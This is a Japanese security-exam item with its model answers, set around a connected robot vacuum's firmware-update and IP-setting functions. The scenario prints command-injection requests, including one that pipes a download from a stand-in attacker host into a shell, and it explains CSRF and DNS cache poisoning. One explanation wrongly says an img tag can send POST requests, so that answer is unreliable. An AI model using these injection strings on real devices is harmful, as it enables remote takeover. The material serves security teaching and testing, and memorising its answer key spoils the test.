{
  "qNo": 1,
  "theme": "IoT製品の開発に関するセキュリティ対策",
  "description": "J社は、家電の製造・販売を手掛ける従業員 1,000名の会社である。J社では、自社の売れ筋製品であるロボット掃除機の新製品（以下, 製品Rという）を開発し、販売することにした。製品Rの仕様を図1に示す。\n\n**図1 製品Rの仕様（抜粋）**\n*   掃除機能に加え、無線LANへの接続機能を搭載する。さらに、製品Rがもつ Web アプリケーションプログラム（以下, Web アプリ Rという）経由で掃除エリアを設定する機能や掃除履歴を確認する機能を搭載する。\n*   DHCPでIPアドレスの割当てが行われる。\n*   スマートフォンにインストールした専用のアプリケーションプログラムは、同一セグメント内にある製品Rを探し、Webアプリ Rにアクセスする。\n*   製品Rに設定されたIPアドレスを使い、PCの Web ブラウザから Web アプリRにアクセスすることもできる。\n*   製品Rに搭載するファームウェアにはLinux ベースの OS を用いる。WebアプリRはそのOSの上で動作させる。\n*   WebアプリRは、次の機能を有する。\n    1.  **ログイン機能**: Web アプリ Rを使うために、利用者 IDとパスワードによる認証を行う。\n    2.  **掃除エリア設定機能** (省略)\n    3.  **掃除履歴確認機能** (省略)\n    4.  **ファームウェアアップデート機能**: J社のファームウェア提供サーバ（以下, Wサーバという）からインターネット経由で、新しいバージョンのファームウェアを適用する。本機能では、Wサーバに新しいバージョンのファームウェアが存在するかどうかを確認し、存在する場合にはダウンロードして適用する。本機能は、定期的に実行されるが、利用者から Web アプリ R経由でファームウェアアップデートが要求されたときも実行される。本機能ではWサーバの名前解決を行う。製品 RからWサーバに対するファームウェアアップデートの要求は HTTPS で行う。\n    5.  **IP アドレス設定機能**: 製品Rに新しいIPアドレスを設定する。POST メソッドによる入力だけを受け付ける。\n\nWeb アプリ Rを含むファームウェアの開発は、開発部のFさんとG主任が担当することになった。\n\n### [各機能のセキュリティ対策の検討]\nまず、Fさんは、ファームウェアアップデート機能のセキュリティ対策を検討した。\nファームウェアアップデート機能が偽のファームウェアをダウンロードしてしまうケースを考えた。そのケースには、DNS キャッシュサーバが権威 DNS サーバに W サーバの名前解決要求を行ったときに、攻撃者が偽装したDNS 応答を送信するという手法を使って攻撃を行うケースがある。この攻撃手法は [ a ] と呼ばれる。\nこの攻撃は、DNS キャッシュサーバが通信プロトコルに [ b ] を使って名前解決要求を送信し、かつ、攻撃者が送信したDNS 応答が、当該DNSキャッシュサーバに到達できることに加えて、①幾つかの条件を満たした場合に成功する。攻撃が成功すると、DNS キャッシュサーバが攻撃者による応答を正当な DNS 応答として処理してしまい、偽の情報が保存される。当該DNS キャッシュサーバを製品Rが利用して、この攻撃の影響を受けると、攻撃者のサーバから偽のファームウェアをダウンロードしてしまう。しかし、Fさんは、②製品Rは、Wサーバとの間の通信において HTTPSを適切に実装しているので、この攻撃の影響は受けないと考えた。Fさんは、ファームウェアアップデート機能のセキュリティ対策がこれで十分か、G主任に相談した。\n\nG主任: 攻撃者のサーバから偽のファームウェアをダウンロードさせる攻撃は回避できます。しかし、偽のファームウェアをダウンロードしてしまう場合として、ほかにも、攻撃者がW サーバに侵入するなどの方法でファームウェアを直接置き換える場合もあります。対策として、ファームウェアに [ c ] を導入しましょう。まず、製品 Rでは [ c ] 証明書がJ社のものであることを検証します。その上で、検証された [ c ] 証 明書を使って、ダウンロードしたファームウェアの真正性を検証しましょう。\n\nFさん: 分かりました。\n\n続いて、Fさんは, Web アプリ R の実装について開発部の他の部員にレビューを依頼した。その結果、脆弱性Aと脆弱性Bの二つの脆弱性が指摘された。\n\n### [脆弱性 A]\nIPアドレス設定機能には、任意のコマンドを実行してしまう脆弱性がある。図2に示すように、利用者がIPアドレス設定画面でIPアドレス,サブネットマスク及びデフォルトゲートウェイの IP アドレスをそれぞれ入力してから確認ボタンをクリックし、IP アドレス設定確認画面で確定ボタンをクリックすると, setvalue に対して図3に示すリクエストが送信される。setvalue が図3中のパラメータを含むコマンド文字列をシェルに渡すと、図4のIPアドレス設定を行うコマンドなどが実行される。\n\n**図2 IP アドレス設定に用いる画面**\n```mermaid\ngraph LR\n    subgraph IPアドレス設定画面\n        A[IPアドレス: 192.168.1.101]\n        B[サブネットマスク: 255.255.255.0]\n        C[デフォルトゲートウェイ: 192.168.1.1]\n        D(確認)\n    end\n    \n    subgraph IPアドレス設定確認画面\n        E[次の値を設定します。]\n        F[IPアドレス: 192.168.1.101]\n        G[サブネットマスク: 255.255.255.0]\n        H[デフォルトゲートウェイ: 192.168.1.1]\n        I(確定)\n    end\n    \n    D --> I\n    I --> SetValue_Request(POST /setvalue)\n    \n    %% 画面の遷移を示す。ユーザーはIP設定後、確認画面を経て確定する。\n```\n\n**図3 setvalue に送信されるリクエスト**\n```http\nPOST /setvalue HTTP/1.1\nHost: 192.168.1.100 1)\n(中略)\nipaddress=192.168.1.101&netmask=255.255.255.0&defaultgw=192.168.1.1\n```\n注1) \"192.168.1.100”は、製品Rの変更前のIPアドレスである。\n\n**図4 IPアドレス設定を行うコマンド**\n```shell\nifconfig eth1 \"192.168.1.101\" netmask \"255.255.255.0\"\n```\nリクエストに対する setvalue の処理には、 [ d ] してしまうという問題点があるので、setvalue に対して、図5に示す細工されたリクエストが送られると、製品Rは想定外のコマンドを実行してしまう。\n\n**図5 細工されたリクエストの例**\n```http\nPOST /setvalue HTTP/1.1\nHost: 192.168.1.100\n(中略)\nipaddress=192.168.1.101&netmask=255.255.255.0\";ping -c 1 192.168.1.10;\"&defaultgw=192.168.1.1 1) 2)\n```\n注1) “192.168.1.10”は、製品Rから到達可能なIPアドレスである。\n注2) URL デコード済みである。\n\n### [脆弱性 B]\nIP アドレス設定機能には、ログイン済みの利用者が攻撃者によって設置された罠サイトにアクセスし、利用者が意図せずに悪意のあるリクエストをWeb アプリRに送信させられた場合に、Web アプリ Rがそのリクエストを受け付けて処理してしまう脆弱性がある。\n\n### [脆弱性の修正]\nFさん : 脆弱性 A ですが、悪用されるリスクは低いです。というのは、利用者宅内にある製品 R は、インターネットからは直接アクセスできないと想定されるからです。攻撃するには、攻撃者は利用者宅の同一セグメントにつなぎ、不正なログインも成功させる必要があります。修正の優先度を下げてもよいのではないでしょうか。\n\nG主任: 確かに脆弱性 Aだけを悪用されるリスクは低いでしょう。しかし、例えば、攻撃者が、Web アプリ Rにログイン済みの利用者を罠サイトに誘い、③図6 の攻撃リクエストを送信させると、脆弱性 B が悪用され、その後、脆弱性 A が悪用されます。この結果、製品 Rは攻撃者のファイルをダウンロードして実行してしまいます。このリスクは低くありません。\n\n**図6 攻撃リクエスト**\n```http\nPOST /setvalue HTTP/1.1\nHost: 192.168.1.100\n(中略)\nipaddress=192.168.1.101&netmask=255.255.255.0\";curl http://△△△.com | /bin/sh -;\"&defaultgw=192.168.1.1 1) 2)\n```\n注1) “http://△△△.com”は、攻撃者のファイルをダウンロードさせるためのURLである。\n注2) URL デコード済みである。\n\nFさん: 分かりました。脆弱性Aと脆弱性Bの両方を修正します。\n\nFさんは、脆弱性Aへの対策として、利用者からリクエストのパラメータとして受け取ったIPアドレス情報を、コマンドを用いず安全にIPアドレスを設定できるライブラリ関数を利用する方法で設定することにした。次に、脆弱性Bについては、利用者からのリクエストのパラメータに、セッションにひも付けられ、かつ、 [ e ] という特徴をもつトークンを付与し、WebアプリRはそのトークンを検証するように修正した。\n\nFさんとG主任は、そのほかに必要なテストも行って, Web アプリ Rを含むファームウェアの開発を完了した。",
  "questions": [
    {
      "subQNo": "設問1",
      "text": "〔各機能のセキュリティ対策の検討〕について答えよ。\n(1) 本文中の [ a ] に入れる攻撃手法の名称を15字以内で答えよ。\n(2) 本文中の [ b ] に入れる適切な字句を、解答群の中から選び、記号で答えよ。\n解答群\nア ARP\nイ ICMP\nウ TCP\nエ UDP\n(3) 本文中の下線①について、攻撃者が送信した DNS 応答が攻撃として成功するために満たすべき条件のうちの一つを、30字以内で答えよ。\n(4) 本文中の下線②について、どのような実装か。40字以内で答えよ。\n(5) 本文中の [ c ] に入れる適切な字句を10字以内で答えよ。",
      "explanation": "### 設問1の解説\n\n#### (1) [ a ] (攻撃手法の名称)\n\n攻撃者が偽装したDNS応答を送信することで、DNSキャッシュサーバに誤った名前解決情報（WサーバのIPアドレスとして攻撃者のサーバのIPアドレス）を登録させる手法です。これはDNSキャッシュポイズニングと呼ばれます。\n\n**解答:** DNSキャッシュポイズニング\n\n#### (2) [ b ] (通信プロトコル)\n\nDNSの名前解決要求（標準的な問い合わせ）は、通常、効率を優先してコネクションレス型プロトコルであるUDPが用いられます。\n\n**解答:** エ (UDP)\n\n#### (3) 下線① (攻撃成功の条件)\n\nDNSキャッシュポイズニング攻撃を成功させるためには、攻撃者が偽の応答パケットを正規の応答よりも早くキャッシュサーバに到達させる必要があります。この際、偽の応答が正規の問い合わせに対応していると認められるためには、攻撃者はDNS問い合わせに含まれるランダムな識別子であるトランザクションID（Query ID）を正確に推測して、応答パケットに含める必要があります。\n\n**解答:** DNS問い合わせのトランザクションIDを推測して一致させること\n\n#### (4) 下線② (HTTPSの適切な実装)\n\n製品RがWサーバとの通信にHTTPSを使用している場合、中間者攻撃（Man-in-the-Middle attack）によって偽のサーバに誘導されても、通信相手の正当性を検証できます。HTTPS通信では、TLSプロトコルを使用し、Wサーバから提供される証明書が信頼できる認証局によって発行されたものであり、かつその証明書がWサーバ（J社）のものであることを確認します。\n\n**解答:** Wサーバの証明書の正当性を検証する機能を実装している\n\n#### (5) [ c ] (ファームウェアの真正性検証)\n\nファームウェアの改ざんを防ぎ、J社が提供した本物であることを検証するためには、ファームウェア自体に**デジタル署名**を施します。製品Rは、この署名を検証することで、ダウンロードしたファームウェアの真正性を確認できます。\n\n**解答:** デジタル署名",
      "subQuestions": [
        {
          "label": "(1)",
          "text": "本文中の [ a ] に入れる攻撃手法の名称を15字以内で答えよ。",
          "point": 12
        },
        {
          "label": "(2)",
          "text": "本文中の [ b ] に入れる適切な字句を、解答群の中から選び、記号で答えよ。",
          "point": 11
        },
        {
          "label": "(3)",
          "text": "本文中の下線①について、攻撃者が送信した DNS 応答が攻撃として成功するために満たすべき条件のうちの一つを、30字以内で答えよ。",
          "point": 11
        },
        {
          "label": "(4)",
          "text": "本文中の下線②について、どのような実装か。40字以内で答えよ。",
          "point": 11
        },
        {
          "label": "(5)",
          "text": "本文中の [ c ] に入れる適切な字句を10字以内で答えよ。",
          "point": 11
        }
      ]
    },
    {
      "subQNo": "設問2",
      "text": "本文中の [ d ] に入れる適切な字句を35字以内で答えよ。",
      "explanation": "### 設問2の解説\n\n脆弱性Aは、IPアドレス設定機能において、ユーザーが入力したパラメータをそのままシェルコマンドの一部として実行していることに起因します。\n\n図5のリクエスト例を見ると、`netmask`の値の末尾に `\";` が挿入され、コマンド文字列を一旦終了させた後、意図しないコマンド（`ping`）を挿入しています。\n\n図4で示されているように、本来の処理は `ifconfig eth1 \"IP\" netmask \"MASK\"` のようなコマンドを生成することです。入力値を適切にエスケープ処理せず、コマンドの一部として連結してしまっているため、ユーザー入力がシェルの区切り文字（;や|など）を使って新しいコマンドを挿入できてしまいます。\n\n**解答:** パラメータをシェルで実行するコマンドにそのまま渡す",
      "subQuestions": [],
      "point": 11
    },
    {
      "subQNo": "設問3",
      "text": "〔脆弱性の修正〕について答えよ。\n(1) 本文中の下線③について,罠サイトではどのような仕組みを使って利用者に脆弱性Bを悪用する攻撃リクエストを送信させることができるか。仕組みを50字以内で具体的に答えよ。\n(2) 本文中の [ e ] に入れる、トークンがもつべき特徴を 15字以内で答えよ。",
      "explanation": "### 設問3の解説\n\n#### (1) 下線③ (罠サイトの仕組み)\n\n脆弱性Bは、ログイン済みの利用者セッションを利用して意図しないリクエストを送信させるクロスサイトリクエストフォージェリ（CSRF）です。\n\n罠サイトでは、利用者がサイトを訪問した際に、ブラウザが自動的にPOSTリクエストを製品Rに送信するように仕組む必要があります。これには、目に見えないフォーム要素（`<form>`）を作成し、JavaScriptや自動送信属性を使ってPOSTリクエストをトリガーするか、あるいはPOSTリクエストを送信するHTML要素（例えば、スタイルを工夫した画像タグなど、POSTを実行できる方法）を利用します。\n\n**解答:** 罠サイトに配置したHTMLフォーム要素やimgタグなどを用いて、ログイン済みの利用者から製品Rに対してPOSTリクエストを自動的に送信させる\n\n#### (2) [ e ] (トークンの特徴)\n\nCSRF対策として導入するトークン（CSRFトークン）は、攻撃者が推測できないようにすることで、偽のリクエストの送信を無効化します。もし推測可能だと、攻撃者はリクエストに正しいトークンを含めてしまうことができます。\n\n**解答:** 推測が困難である",
      "subQuestions": [
        {
          "label": "(1)",
          "text": "本文中の下線③について,罠サイトではどのような仕組みを使って利用者に脆弱性Bを悪用する攻撃リクエストを送信させることができるか。仕組みを50字以内で具体的に答えよ。",
          "point": 11
        },
        {
          "label": "(2)",
          "text": "本文中の [ e ] に入れる、トークンがもつべき特徴を 15字以内で答えよ。",
          "point": 11
        }
      ]
    },
    {
      "subQNo": "設問4",
      "text": "脆弱性A及び脆弱性Bが該当する CWEを、それぞれ解答群の中から選び、記号で答えよ。\n解答群\nア CWE-78 OS コマンドインジェクション\nイ CWE-79 クロスサイトスクリプティング\nウ CWE-89 SQL インジェクション\nエ CWE-94 コードインジェクション\nオ CWE-352 クロスサイトリクエストフォージェリ\nカ CWE-918 サーバサイドリクエストフォージェリ",
      "explanation": "### 設問4の解説\n\n#### 脆弱性A\n\nユーザーからの入力値（IPアドレス情報）を検証せずに、OSのシェルコマンドの一部として連結し実行してしまう脆弱性です。これにより、図5や図6のように、攻撃者は任意のOSコマンドを実行できます。これは、CWE-78 (OSコマンドインジェクション)に該当します。\n\n**脆弱性Aの解答:** ア (CWE-78 OS コマンドインジェクション)\n\n#### 脆弱性B\n\nログイン済みの利用者を罠サイトに誘導し、その利用者の権限で意図しないリクエスト（POST /setvalue）をWebアプリRに送信させてしまう脆弱性です。これは、CWE-352 (クロスサイトリクエストフォージェリ)に該当します。\n\n**脆弱性Bの解答:** オ (CWE-352 クロスサイトリクエストフォージェリ)",
      "subQuestions": [],
      "point": 11
    }
  ]
}